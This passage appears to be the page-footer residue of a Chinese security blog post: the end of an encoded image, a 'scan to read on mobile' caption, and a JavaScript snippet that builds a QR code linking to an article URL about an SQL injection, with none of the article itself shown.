JbAOBTBse42pLkLruw1w3t3qKVjqkHwTtUwhHba9DfAj2e8CoQ3j1qGVeLK0WjLnSasGo97rK1ILkgOv/D7l92Nf2hnzYvv5vt/M/AAAA//85Y9OCAAAABklEQVQDAJeim8U1sl6TAAAAAElFTkSuQmCC)

手机扫码阅读


var qrcode = new QRCode(document.getElementById("posts-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/sobey-WXArticleInt-logicdelete-sqli.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});
 